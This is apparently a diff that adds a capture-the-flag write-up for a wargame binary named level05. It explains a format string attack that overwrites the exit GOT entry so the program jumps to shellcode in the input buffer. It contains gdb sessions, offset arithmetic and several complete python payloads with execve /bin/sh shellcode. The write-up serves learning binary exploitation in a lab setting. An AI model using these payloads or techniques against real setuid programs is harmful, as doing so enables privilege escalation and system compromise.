@@ -1,0 +1,83 @@
+The program uses fgets, tranform uppercase chars to lowercase, printf the string, and exits.
+
+We cannot overwrite the return pointer as the program calls "exit", so we can't do a ret to libc attack.
+
+We can however use a format string attack to overwrite the adress of "exit" in the Global Offset Table, so that it points to where we want, in our case it will be a shellcode.
+
+I've taken the shellcode I used for RainFall, found here: https://0xrick.github.io/binary-exploitation/bof5/#ShellCode
+
+We can place the shellcode in the fgets buffer, as it is only 55 bytes long.
+We can make sure that it will be not modified by the tolower() of the program by prepending some '\0' before the shellcode
+
+Find the adress to override with the %n:
+(gdb) disass 0x8048370 (exit function called at the end)
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
+   0x08048376 <+6>:	push   $0x18
+   0x0804837b <+11>:	jmp    0x8048330
+End of assembler dump.
+
+The adress we need to override is 0x80497e0
+
+Find the adress of the string:
+env -i gdb /home/users/level05/level05
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) b *0x08048507  (before the printf)
+(gdb) run
+<enter anything>
+(gdb) x/a $esp
+0xffffd680:	0xffffddc8
+
+The adress it as 0xffffddc8, we can verify it with
+(gdb) x/s 0xffffddc8
+which prints the string we entered.
+
+Our shellcode is 55 bytes long and we will put it at the end of the buffer,
+44 bytes after the start of the string, so it's adress is 0xffffddf4 (4294958580 in decimal)
+
+We now need to find which argument to printf points to the start of our string:
+./level05
+aaaabbbb %p %p %p %p %p %p %p %p %p %p %p %p
+prints
+aaaabbbb 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6cf 0xffffd6ce (nil) 0xffffffff 0xffffd754 (nil) 0x61616161 0x62626262 0x20702520
+the 10th argument is 0x61616161, 0x61 = 'a'
+
+Let's try to override the start of our string to check if it works:
+(gdb) b *0x08048507
+(gdb) r < <(python -c "print '\xc8\xdd\xff\xff' + '%1094795581d%10\$n'")
+(gdb) ni
+<wait for the loooong printf>
+(gdb) x/s 0xffffddc8
+0xffffd6a8:	 "AAAA%1094795581d%10$n\n"
+it worked!
+
+our exploit could then be:
+(python -c "print '\xe0\x97\x04\x08' + '%4294958580d' + '%10\$n' + '\x00' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") | /home/users/level05/level05
+
+But the size of the field width is too big for printf and it returns immediately without doing anything...
+We need to split the adress in two parts, 0xffff and 0xddf4
+
+0xddf4 = 56820, 0xffff = 65535, 65535 - 56820 = 8715
+
+We will print 56820 chars, %n to 0x080497e0, print 8715 chars, and %n to 0x080497e0 + 2 = 0x080497e2
+(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56812d' + '%10\$n' + '%8715d' + '%11\$n' + '\x00' + '\x90' * 12 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") | env -i /home/users/level05/level05
+
+It works on gdb, but not outside despite my efforts to remove all env variables...
+
+We can calculate the offset of the stack of our program with and outside of gdb, by checking the adresses on the stack:
+env -i gdb /home/users/level05/level05
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) run
+%p %p %p %p %p
+0x64 0xf7fcfac0 0xf7ec3af9 0xffffddef 0xffffddee
+
+env -i /home/users/level05/level05
+%p %p %p %p %p %p %p %p %p %p %p %p
+0x64 0xf7fcfac0 0xf7ec3af9 0xffffde0f 0xffffde0e
+
+There are two adresses on the stack that are printed by printf, and they are offsetted by 32 each, so we will just add 32 to our stack adresses for the exploit to work outside of gdb
+
+0xddf4 + 32 = 56852, 0xffff = 65535, 65535 - 56852 = 8683
+(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56844d' + '%10\$n' + '%8683d' + '%11\$n' + '\x00' + '\x90' * 12 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") | env -i /home/users/level05/level05
